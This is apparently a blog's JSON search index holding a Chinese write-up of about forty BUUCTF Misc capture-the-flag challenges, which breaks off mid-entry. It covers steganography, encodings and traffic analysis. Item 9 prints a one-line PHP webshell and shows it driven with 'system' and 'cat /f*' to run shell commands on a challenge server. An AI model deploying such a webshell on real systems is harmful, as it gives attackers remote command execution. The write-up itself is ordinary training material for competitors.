{"meta":{"title":"张岩的博客","subtitle":"","description":"随手写写","author":"张岩","url":"http://xxxkkk578.github.io","root":"/"},"pages":[{"title":"categories","date":"2024-04-09T16:15:55.000Z","updated":"2024-04-09T16:15:55.835Z","comments":true,"path":"categories/index.html","permalink":"http://xxxkkk578.github.io/categories/index.html","excerpt":"","text":""},{"title":"文章归档","date":"2024-04-09T15:51:42.302Z","updated":"2024-04-09T15:51:42.302Z","comments":true,"path":"archive.html","permalink":"http://xxxkkk578.github.io/archive.html","excerpt":"","text":""}],"posts":[{"title":"BUUCTF篇-Misc部分题解","slug":"CTF/buu_misc","date":"2024-04-09T16:25:43.000Z","updated":"2024-04-09T16:41:20.386Z","comments":true,"path":"2024/04/10/CTF/buu_misc/","permalink":"http://xxxkkk578.github.io/2024/04/10/CTF/buu_misc/","excerpt":"","text":"MISC1、[NewStarCTF 2023 公开赛道]机密图片zsteg 1zsteg secret.png 2、[NewStarCTF 2023 公开赛道]CyberChef’s Secret加密 1M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA= cyber_chef 选择magic参数 即可获得flag 3、[NewStarCTF 2023 公开赛道]流量！鲨鱼！wireshark打开导出http对象使用cyber_chef magic解密 4、[NewStarCTF 2023 公开赛道]压缩包们发现压缩包损坏 不见pk头补上50 4B 03 04解压得又一个压缩包尝试解压 报错查看zip文件时在备注发现一串base64编码 1SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg== 解密后 1I like six-digit numbers because they are very concise and easy to remember. 说明密码六位 爆破即可使用ziperello破解得密码为232311banzip修复flag.zip解压得到flag 5、[NewStarCTF 2023 公开赛道]隐秘的眼睛图片上有很多小灰斑使用silenteye解码即可 6、[NewStarCTF 2023 公开赛道]空白格WhiteSpace是一种只用空白字符（空格，Tab，回车）编程的语言在如下网站上可以解码 1https://vii5ard.github.io/whitespace/ 7、[NewStarCTF 2023 公开赛道]永不消逝的电波摩斯密码加电波 8、[NewStarCTF 2023 公开赛道]base!base64隐写使用如下脚本进行解密 12345678910111213# coding:gbkimport base64b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;#在这一行我们的工作就是简单的做一个base64的参照表，后面会解释作用。with open(&#x27;base.txt&#x27;, &#x27;rb&#x27;) as f: bin_str = &#x27;&#x27; for line in f.readlines(): stegb64 = str(line, &quot;utf-8&quot;).strip(&quot;\\r&quot;).strip(&#x27;\\n&#x27;)#输出的时候好像还是有回车 rowb64 = str(base64.b64encode(base64.b64decode(stegb64)), &quot;utf-8&quot;).strip(&quot;\\r\\n&quot;)#要加“utf-8”不加会报错 equalnum = stegb64.count(&#x27;=&#x27;) if equalnum:#刚刚从我们的分析过程中可以看到，如果在一串base64编码的字符串中，没有等号是不可能隐藏数据的，所以这里要判断一 offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1]))#这里要算一下偏移量，可能就这么说偏移量大家可能不是很懂，我就用简单通俗的话来讲吧。如果咱们不去隐写数据的话，最后补位的一定全是零，那么用咱们得到的隐写数据的二进制减去那些补位是零的二进制数据（他们两个的头部都是从前面继承的），那么就会得到咱们隐写进去的非零二进制数据。 bin_str += bin(offset)[2:].zfill(equalnum * 2) print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in range(0, len(bin_str), 8)])) 之后再放入cyberchef magic解密 得到flag base58加密 9、[NewStarCTF 2023 公开赛道]WebShell的利用php源码混淆解密 1234567&lt;?php//加密方式：php源码混淆类加密。免费版地址:http://www.zhaoyuanma.com/phpjm.html 免费版不能解密,可以使用VIP版本。//此程序由【找源码】http://Www.ZhaoYuanMa.Com (免费版）在线逆向还原，QQ：7530782 ?&gt;&lt;?phperror_reporting(0);($_GET[&#x27;7d67973a&#x27;])($_POST[&#x27;9fa3&#x27;]);?&gt; 则结合题目 1我们在服务器上发现了一个奇奇怪怪的WebShell，研究一下如何利用它去获取服务器权限吧（index.php即为WebShell，直接交互即可） 传参即可 1http://3446ac3e-a9f6-4edf-8bd9-e663aa1a4b0a.node5.buuoj.cn:81/index.php?7d67973a=system POST参数 19fa3=cat /f* 10、[NewStarCTF 2023 公开赛道]1-序章编写如下python脚本利用日志 1234567891011121314151617import urllib.parsef = open(&quot;access.txt&quot;,&quot;r&quot;).readlines()s = []for i in range(0,3523): data = urllib.parse.unquote(f[i])#url解码 payload = data.split(&quot;or&quot;)[2]#截取and后面的字符 number = payload.find(&quot;from user),&quot;)#确定大概的位置 data1 = payload[number+ 11:].split(&quot;,&quot;)[0]#取第一个数据 data2 = payload[number + 11:].split(&quot;=&quot;)[1].split(&quot;,&quot;)[0]#取&gt;后的数据 s.append([data1,data2]) #转码输出for i in range(1,len(s)): if (s[i][0] != s[i-1][0]): print(chr(int(s[i-1][1])),end=&quot;&quot;)#输出变化前的最后一个字符 11、[NewStarCTF 2023 公开赛道]Jvavjava盲水印 使用blindwatermark工具加上隐藏的水印 1java -jar .\\BlindWatermark-v0.0.3-windows-x86_64.jar decode -c .\\challenge.png 1.png 12、[NewStarCTF 2023 公开赛道]新建Word文档word里啥也没有另存为xml文件可以看到内容再复制 1新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑 出来到 新约佛论禅 佛曰解密即可 1http://hi.pcmoe.net/buddha.html 13、[V&amp;N2020 公开赛]拉胯的三条命令tcp三次握手 在kali上运行如下命令 1tcpdump -n -r nmapll.pcapng &#x27;tcp[13] = 18&#x27; | awk &#x27;&#123;print $3&#125;&#x27; | sort -u 得到 123456reading from file nmapll.pcapng, link-type EN10MB (Ethernet), snapshot length 262144127.0.0.1.21127.0.0.1.22127.0.0.1.3306127.0.0.1.631127.0.0.1.801 则flag 1flag&#123;21226318013306&#125; 14、[NewStarCTF 2023 公开赛道]隐秘的图片放进stegsolve里analyseimage combiner将两张图片异或即可 15、[NewStarCTF 2023 公开赛道]Nmap限定tcp分组列表 字符串 搜索 1SYN, ACK 记录source port即可 16、[NewStarCTF 2023 公开赛道]R通大残1zsteg secrect.png -a 17、[NewStarCTF 2023 公开赛道]依旧是空白使用工具爆破图片宽高并修复获得密码 1s00_b4by_f0r_y0u snow隐写 1SNOW.EXE -p s00_b4by_f0r_y0u -C White.txt 18、[Dest0g3 520迎新赛]你知道js吗wingding是字符 将字体切换为宋体之后 base64解密 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt;&lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt; &lt;requestedExecutionLevel level=&quot;asInvoker&quot; uiAccess=&quot;false&quot;/&gt;&lt;application xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt; &lt;dpiAwareness xmlns=&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;&gt;Do you know js&lt;/dpiAwareness&gt;&lt;script language=&quot;javascript&quot;&gt;document.write(unescape(&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;));&lt;/script&gt; 控制台 1console.log(unescape(&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;)); 得到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;html&gt;&lt;body&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Do You Know js&lt;/title&gt;&lt;HTA:APPLICATION APPLICATIONNAME=&quot;Do You Know js&quot; ID=&quot;Inception&quot; VERSION=&quot;1.0&quot; SCROLL=&quot;no&quot;/&gt; &lt;style type=&quot;text/css&quot;&gt;&lt;/head&gt; &lt;div id=&quot;feature&quot;&gt; &lt;div id=&quot;content &lt;/style&gt; &lt;h1 id=&quot;unavailable&quot; class=&quot;loading&quot;&gt;Building js.....&lt;/h1&gt; &lt;script type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt; function RunFile() &#123; var WshShell = new ActiveXObject(&quot;WScript.Shell&quot;); WshShell.Run(&quot;notepad %windir%/Desktop/js.txt&quot;, 1, false); /* var oExec = WshShell.Exec(&quot;notepad&quot;); */ &#125; &lt;/script&gt; &lt;/div&gt; &lt;/div&gt;&lt;body&gt; &lt;input type=&quot;button&quot; value=&quot;Implant Inception Here&quot; onclick=&quot;RunFile();&quot;/&gt; &lt;p style=&quot;color:white;&quot;&gt;+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- -.-.- --.++ ++++.+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- &gt;---&lt; ]&gt;--- ---.+ ++++. -----.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+ +++++ .---- -.++. ++.+.--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- .+.-. ---.+ ++.+. -.++++.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.----.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ .---- .+.++ ++.-- --.++++.-. ----. +.-.+ ++++. &lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;&lt;/p&gt;&lt;/body&gt;&lt;/body&gt; &lt;/html&gt; brainfuck解密 1446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D 每两位分割 将十六进制转成ascii 12345678910111213s = &#x27;446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D&#x27;dic = []count = 0for i in range(0,len(s),2): dic.append(s[i:i+2]) flag = &#x27;&#x27;for i in dic: try: flag += chr(int(i,16)) except: passprint(flag) 19、[Dest0g3 520迎新赛]Pngenius先zsteg查看图片 发现一个password再binwalk分离 得到压缩包使用password解开压缩包 得到flag 20、[BJDCTF 2nd]A_Beautiful_Picture爆破宽高即可 1flag&#123;PnG_He1ghT_1s_WR0ng&#125; 21、[BJDCTF 2nd]小姐姐-y1nglinux中运行 1strings xiaojiejie.png | grep BJD 得到flag 1flag&#123;haokanma_xjj&#125; 22、[NewStarCTF 2023 公开赛道]大怨种打开图片有张二维码一闪而过使用stegsolve的frame browser模块即可然后汉信码识别即可 1https://tuzim.net/hxdecode/ 23、[NewStarCTF 公开赛赛道]奇怪的文本字频统计即可 24、[NewStarCTF 公开赛赛道]qsdz’s girlfriend 11我失忆了，这是我在我桌面上发现的压缩包，可是我忘记了压缩包密码了...请问你能帮助我找到我女朋友的名字吗？flag格式为：flag&#123;女朋友名字_女朋友生日&#125; 解压压缩包需要密码打开压缩包 在注释里面找到了提示 1压缩包密码是我女朋友的生日！ 则ziperello爆破8位数字 猜测20开头 爆破得到密码 120031201 得到一张图片 谷歌识图找到名字即可 25、[Dest0g3 520迎新赛]EasyEncode爆破数字密码 1100861 打开后发现是摩斯密码 –..的翻译后是一大堆数字十六进制转ascii发现是unicode 因为都是\\uunicode解码后 又得到一串字符 1RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D 直接cyberchef 是base64加密 26、[NewStarCTF 公开赛赛道]Whats HTTPwireshark打开后 导出http对象 发现文件 1ssssssecret python 12import base64b64decode(&#x27;NjY2YzYxNjc3YjM0NjYzMzMzMzYzNDM5NjQzMDMzMzA2MzM2MzczNzM4MzQzMjM2MzkzNzMxNjIzNTM0NjQ2NDM3MzI2NTYzNjU3ZA==&#x27;) 之后得到 1b&#x27;666c61677b34663333363439643033306336373738343236393731623534646437326563657d&#x27; 再运行 1bytes.fromhex(&#x27;666c61677b34663333363439643033306336373738343236393731623534646437326563657d&#x27;) 27、[2022DASCTF MAY 出题人挑战赛]不懂PCB的厨师不是好黑客payload 在对应文件夹内运行即可 1grep -rn &#x27;DASCTF&#x27; ./* 28、[BJDCTF 2nd]最简单的misc-y1ngzip伪加密缺少png头 补上即可 189 50 47 4e 图片上有一串数字 142A447B79316E677A756973687561697D hex解码即可得到flag 29、[陇原战”疫”2021网络安全大赛]soEasyCheckin一开始解码失败发现是因为混入了一个$字符 删除后 对剩余两部分分别进行解码前半部分是base32 解码出来之后得到 1平等和谐自由平等平等自由法治友善平等平等民主公正敬业和谐文明平等爱国公正敬业公正诚信自由和谐民主平等爱国公正敬业公正平等和谐文明自由友善公正公正敬业和谐自由文明友善法治自由友善公正公正友善敬业公正诚信自由公正法治和谐和谐平等敬业法治平等公正民主公正诚信自由和谐 核心价值观编码解码时抱错 把最后两个和谐删除即可得到前半部分的flag 1SET&#123;Qi2Xin1Xie2Li4-Long3Yuan 再解码后半部分base32后乱码 原因是长度不够 在前面添上777解码成功将得到的内容 hex解码 16988ee5b9b3e7ad89e58f8be59684e887aae794b1e585ace6ada3e788b1e59bbde585ace6ada3e6b091e4b8bbe585ace6ada3e58f8be59684e788b1e59bbde5928ce8b090e887aae794b1e5b9b3e7ad89e695ace4b89ae585ace6ada3e695ace4b89ae5928ce8b090e887aae794b1e6b395e6b2bbe8af9ae4bfa1e5928ce8b090 乱码 删除掉第一个6之后即可正常解码 再次核心价值观解码即可得到后半段flag 1Zhan4Yi4&#125; 拼接 1SET&#123;Qi2Xin1Xie2Li4-Long3YuanZhan4Yi4&#125; yuan后面应该还有一个数字 经测试 为2 30、[VNCTF2022公开赛]仔细找找取出杂色点即可 12345import sysfrom PIL import Imageimg=Image.open(&quot;flag.png&quot;)img = img.resize((79, 71), Image.NEAREST)img.save(&quot;flag2.png&quot;) 得到flag 1vnctf&#123;34aE@w&#125; 31、[Dest0g3 520迎新赛]OCR宽高修复之后 得到图片文件 图片上都是十六进制 保存为7z文件后 1377ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022194A676D2FDE351A055c168F9710364AE2D581126E378F3B4c47E15E2E80B74234B849430A221F40C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D0357995A2FB65D31CD99c853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FFE31ED0C0CEF0CA0B68C0CCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFC0FEAAE92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EFDE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C5595E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074c27F81c719D98717F4ECD32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F0600FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A0395DB9A445B94C44771B406F962B1CFC8535BA0D3EE3DDDEB876C95092AAB192B168A732F3A7B9E8156c403c583983F5527A0D6c5D6928481D56955474046D9FC17A2DE21F3D6FC4c69644E7c6A141BE948A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B010001212101000C84D100080A0196EAFE6000000501190A0000000000000000000011190044006500730074003000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000000000 得到一串base64加密后的字符串 1RGVzdDBnM3szNDUxMjA5OC0zMzA5LTc3MTItODg2NS03ODM0NjAyMjE2NDd9 解码后即可得到flag 32、[NewStarCTF 2023 公开赛道]滴滴滴解压后得到两个文件一个是音频文件另一个是一张图片对音频文件 1dtfm2num 1.wav 得到dtfm数字 152563319066 再使用steghide对图片进行解密即可 1steghide extract -sf secret.jpg -p 52563319066 33、[NewStarCTF 2023 公开赛道]阳光开朗大男孩flag.txt文件中是一大堆表情需要使用emoji-aes进行解密但是emoji-aes解密还需要key 那么key就在secret.txt文件当中显然是社会主义核心价值观解密 得到key 1this_password_is_s000_h4rd_p4sssw0rdddd key为 1s000_h4rd_p4sssw0rdddd 经过emoji-aes decrypt后 即可得到flag 34、[NewStarCTF 公开赛赛道]奇怪的PDF发现缺少文件头 补全即可 125 50 44 46 使用wbstego进行解密即可 无密码 得到flag 1flag&#123;PDF_1s_n0t_strang3&#125; 35、[BJDCTF 2nd]Real_EasyBaBa使用010editor打开 在右侧的小框中 发现了字符画 得到flag 1BJD&#123;572154976&#125; 36、[DASCTF X CBCTF 2023｜无畏者先行]justlisten二维码一眼汉信码 解码之后得到的内容为 10urS3cret 则利用oursecret工具 对bmp文件进行处理 密码就是0urS3cret得到字符串 10urS3cret 打开音频, 留意到这个37.8秒的音频中, 每0.1秒都会有一个固定频率。 因此思路是先分成378段, 然后统计频率数量。 这里简单讲讲我的粗糙实现方法：先是读入数据, 然后每4410分一段, 然后考虑到直接做傅里叶变换可能不会出来一些稀疏系数(也就是可能不能直接看出来具体的精准频率)。所以我做的方法是, 对每个序列的第二个值(第一个值全部为0)进行统计, (复制到excel中, 然后去除重复值)发现一共只有10种不同的值。因此可以推断只有10种频率, 直接就把378行映射成378个值。按照从小到大的顺序对这10个频率分别编码成0-9 提取出数字序列如下 1090003090700030910000310000710030710002207031005192203203432284426284735274836292742424842463147282734424837362942334607200806240618111002131804010009201403081110001813210014112205130210200100062118140837333628131003010921082018040805110700221310210109100321110418100005131000221514051415000514292644284531644807521819110813066219616228141321042462081305141712001952141367676763 留意到378&#x3D;189*2, 后面的统计也发现, 如果两位为一个数, 则没有超过68的数字, 猜测每两位组成字母表对应的一个位置。 尝试解密, 得到如下结果 1jadjhadjkadkahkdhkawhdkftwduIGCSACVJBWKDBQQWQUFVCBIQWLKDQHUhuigygslkcnsebajuodilkasnvaolwfnckubagvsoiLHKCnkdbjviuseiflhawnkvbjkdvleskafnkawpofopafoDASCTF&#123;Wh1stling_t0_Convey_informat1on!!!&#125; 37、[DASCTF Oct X 吉林工师 欢迎来到魔法世界～]giveyourflag压缩包嵌套重复解压缩即可python脚本如下 切记要单独放在一个文件夹里 在桌面解压直接给我干报废了 1234567891011import zipfilef = zipfile.ZipFile(&quot;flag1&quot;, &#x27;r&#x27;)while 1: try: name = f.namelist()[0] print(name) f.extractall() f = zipfile.ZipFile(name, &#x27;r&#x27;) except: break 然后会得到一串base64 1R0RWRldJezdnZ3FnbGwzanl1a2RuY3N0aTlpY3BjM2ZlYjB2NW9wfQ== 解码后得到 1GDVFWI&#123;7ggqgll3jyukdncsti9icpc3feb0v5op&#125; 初具雏形 但是前面的flag标志不太正确 按理来说应该是DASCTF凯撒密码解码 在cyberchef中选择 ROT13参数 不勾选Rotate numbers 设置为-3 即可得到flag 1DASCTF&#123;7ddndii3gvrhakzpqf9fzmz3cby0s5lm&#125; 38、[NewStarCTF 公开赛赛道]最后的流量分析sqli.pcap 则猜想应该是和sql注入相关的按包的长度进行排序 发现长度在768及以上的为注入成功的流量包 或者直接搜索flag也可以发现接着使用tshark进行解密即可 注意要在linux系统下运行 1tshark -r sqli.pcap -T fields -Y &quot;http.request.method==GET or frame.len&gt;765&quot; -e &quot;frame.len&quot; -e &quot;http.request.uri.query.parameter&quot; &gt; data.txt 然后对导出的data.txt文件 使用python进行处理 导出处理结果 12345678910from urllib.parse import *import recomment = &#x27;&#x27;with open(&#x27;data.txt&#x27;) as f: lines = f.readlines() for i in range(len(lines)): if int(lines[i][:3])&gt;765: comment += re.findall(r&#x27;&quot;(.)&quot;&#x27;, unquote(lines[i-1]))[0]print(comment) 即可获得flag 39、[NewStarCTF 公开赛赛道]Look my eyes由题目简介中 1请看着我沉默的眼睛 则silenteye解码之后得到 1ZmxhZ3tMMG9rX20zXzFuX215X2V5M3N9 直接cyberchef base64 获得flag 1flag&#123;L0ok_m3_1n_my_ey3s&#125; 40、[Dest0g3 